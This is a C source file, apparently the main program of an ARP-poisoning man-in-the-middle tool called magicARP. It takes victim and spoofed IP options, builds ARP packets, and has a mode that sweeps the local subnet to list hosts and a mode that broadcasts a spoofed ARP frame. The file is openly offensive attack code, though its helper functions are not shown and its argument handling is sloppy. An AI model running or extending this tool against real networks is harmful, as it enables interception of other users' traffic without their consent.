#include "helpers.h"
#include "parsers.h"
#include "sock_ops.h"
#include "packet_builders.h"

#include <unistd.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <net/ethernet.h>
#include <net/if_arp.h>
#include <linux/if_ether.h>
#include <arpa/inet.h>
#include <getopt.h>
#include <pthread.h>

struct ifreq ifr;
uint8_t *hwaddr;
int if_index;

uint8_t mitm_mode = 0;
uint8_t hosts_mode = 0;

int options_index;
int c;

uint32_t spa, tpa;
char if_name[IFNAMSIZ];

pthread_t recv_thread;

static struct option long_options[] =
{
  {"mitm",      no_argument,       0, '0'},
  {"hosts",     no_argument,       0, '1'},
  {"interface", required_argument, 0, 'i'},
  {"victim",    required_argument, 0, 'v'},
  {"spoofed",   required_argument, 0, 's'},
  {0, 0, 0, 0}
};

void print_help();
void recv_func(void* conn);
void mitm_attk(int sock, struct arp_pac *packet);

int main(int argc, char *argv[]) {
    
    opterr = 0;
    if(argc == 1){
        print_help();
        exit(1);
    }
    while((c = getopt_long(argc, argv, "01i:v:s:", long_options,
                           &options_index)) != -1){
        switch(c){
            case '0': 
                mitm_mode = 1;
                break;
            case '1':
                hosts_mode = 1;
                break;
            case 'i':
                strncpy(if_name, optarg, IFNAMSIZ);
                break;
            case 'v':
                if(inet_pton(AF_INET, optarg, &spa) == 0){ 
                    printf("Enter valid IP format\n");
                    exit(1);
                }
                break;
            case 's':
                if(inet_pton(AF_INET, optarg, &tpa) == 0){ 
                    printf("Enter valid IP format\n");
                    exit(1);
                }
                break;
            case '?':
                print_help();
                exit(1);
        }
    }
    
    int sock = make_socket(if_name);

    if_index = get_if_index(sock, if_name);


    inet_pton(AF_INET, argv[2], &spa);
    inet_pton(AF_INET, argv[3], &tpa);

    hwaddr = get_if_hwaddr(sock, if_name);
    
    struct arp_pac packet = build_arp_request(spa, tpa, hwaddr);
    
    if(mitm_mode)
        mitm_attk(sock, &packet);
    
    if(hosts_mode){
        uint32_t my_addr = htonl(get_if_addr(sock, if_name));
        memcpy(packet.spa, &my_addr, sizeof(uint8_t) * 4);
        uint32_t netmask = get_if_netmask(sock, if_name);
        printf("Netmask: %x\n", netmask);
        uint32_t min_local_ip = (htonl(spa) & netmask);
        printf("MIN IP: %x\n", min_local_ip);
        uint32_t max_local_ip = ((~netmask) | htonl(spa));
        printf("MAX IP: %x\n", max_local_ip);
        printf("Sending to: %u\n", max_local_ip - min_local_ip);
        pthread_create(&recv_thread, NULL, &recv_func, (void *)&sock);
        for(uint32_t i = min_local_ip ; i < max_local_ip ; ++ i){
            char cur_ip[16];
            //inet_ntop(AF_INET, &i, cur_ip, INET_ADDRSTRLEN);
            //printf("Cur HOST IP: %s\n", cur_ip);
            i = htonl(i);
            memcpy(packet.tpa, &i, sizeof(uint8_t) * 4);
            broadcast_frame(sock, &packet);
            i = ntohl(i);
        }
        sleep(3);
        pthread_cancel(recv_thread);
    }
    return 0;
}

void print_help(){
    printf("Usage: magicARP MODE [OPTION...]\n");
    printf("A MITM tool using ARP poisoning\n");
    printf("  MODES:\n");
    printf("    -0, --mitm\tBegin trafic interseption\n");
    printf("    -1, --hosts\tList all hosts on network\n");
    printf("  OPTIONS:\n");
    printf("    -i, --iface\tSpecify network interface\n");
    printf("    -v, --victim\tSet victim IP\n");
    printf("    -s, --spoofed\tSet spoofed IP\n");
}

void recv_func(void* conn){
    
    while(1){
        recv_frame(*((int*)conn));
    }
}

void mitm_attk(int sock, struct arp_pac *packet){
    broadcast_frame(sock, packet);
}
